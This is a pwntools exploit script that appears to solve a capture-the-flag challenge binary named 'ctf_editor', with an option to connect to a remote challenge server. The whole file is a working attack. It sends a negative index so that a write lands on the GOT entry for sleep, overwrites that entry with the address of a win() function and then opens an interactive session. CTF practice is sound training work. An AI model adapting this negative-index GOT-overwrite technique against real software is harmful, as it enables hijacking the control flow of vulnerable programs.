from pwn import *
import math

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b vuln
c
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 22354)
    else:
        return process('./ctf_editor')

p = start()

# Overwrite exit to call win()

win = e.sym['win']
cat = e.sym['categories']
ext = e.got['sleep']

offset = str(math.ceil((cat - ext)/15))
overwrite = b'A'*int(15*(int(offset) - (cat - ext)/15)) + p64(win)

p.recvuntil(b'>>> ')
p.sendline(b'Y')
p.recvuntil(b'>>> ')
p.sendline(b"-"+offset.encode('utf-8'))
p.sendline(overwrite)

p.recvuntil(b'>>> ')
p.sendline(b'Y')
p.recvuntil(b'>>> ')
p.sendline(b'1')
p.recvuntil(b'>>> ')
p.sendline(b'recon')

p.interactive()
